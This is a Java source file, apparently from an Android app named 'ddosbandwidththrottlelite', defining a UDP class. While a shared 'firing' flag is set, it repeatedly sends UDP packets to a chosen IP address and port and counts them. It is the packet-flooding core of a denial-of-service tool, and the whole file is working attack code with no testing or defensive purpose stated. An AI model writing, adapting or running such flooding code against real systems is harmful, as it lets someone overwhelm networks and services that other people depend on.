package com.notebook.idealabs.ddosbandwidththrottlelite;

/**
 * Created by Admin on 10-09-2017.
 */

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDP implements Runnable {
    public static int count = 0;
    public static long startTime = 0;
    private String ip;
    private String message;
    private int pause;
    private int port;

    public UDP(String ip, int port, String message, int pause) {
        this.ip = ip;
        this.port = port;
        this.message = message;
        this.pause = pause;
    }

    public void run() {
        count = 0;
        startTime = System.currentTimeMillis();
        while (dosService.firing) {
            try {
                DatagramSocket clientSocket = new DatagramSocket();
                InetAddress IPAddress = InetAddress.getByName(this.ip);
                byte[] sendData;
                sendData = this.message.getBytes();
                clientSocket.send(new DatagramPacket(sendData, sendData.length, IPAddress, this.port));
                count++;
                clientSocket.close();
                Thread.sleep((long) this.pause);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
